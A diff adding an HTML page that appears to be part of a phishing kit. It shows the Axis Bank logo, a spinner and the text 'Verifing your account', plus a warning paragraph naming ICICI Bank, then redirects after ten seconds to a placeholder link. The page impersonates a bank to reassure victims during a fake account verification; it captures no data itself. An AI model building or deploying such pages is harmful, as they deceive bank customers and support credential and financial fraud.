@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Your Website</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: white;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    
+        .logo {
+      width: 200px;
+      margin: 20px auto;
+      display: block;
+      margin-bottom:30px;
+      
+      
+    }
+    }
+
+    .loading {
+      margin-top: 20px; /* Adjust as needed */
+      font-size: 24px;
+      color: black;
+      
+    }
+
+    .loader {
+      border: 8px solid #f3f3f3; /* Light grey */
+      border-top: 8px solid black; /* Black */
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 2s linear infinite;
+      margin-top:20px;
+      margin-bottom:20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .paragraph {
+      margin-top: 20px; /* Adjust as needed */
+      text-align: center;
+      color: black;
+    }
+  </style>
+</head>
+<body>
+  <!-- Logo -->
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Axis_Bank_logo.svg/2560px-Axis_Bank_logo.svg.png" alt="Logo" class="logo">
+  
+  <!-- Loading -->
+  <div>
+  please wait... 
+  </div>
+  <div class="loading">
+    <div class="loader"></div>
+  </div>
+  <div>
+  Verifing your account
+</div>  
+  <!-- Paragraph -->
+  <div class="paragraph">
+    <p>safe Banking Never share your User ID,Password or any other information with anyone on phone,SMS or Email, ICICI Bank does not call/email customers for such information.Beware of fraudsters asking for such details posing as Bank staff.</p>
+  </div>
+
+  <script>
+    setTimeout(function() {
+      window.location.href = "your_redirection_link_here";
+    }, 10000); // 10 seconds
+  </script>
+</body>
+</html>
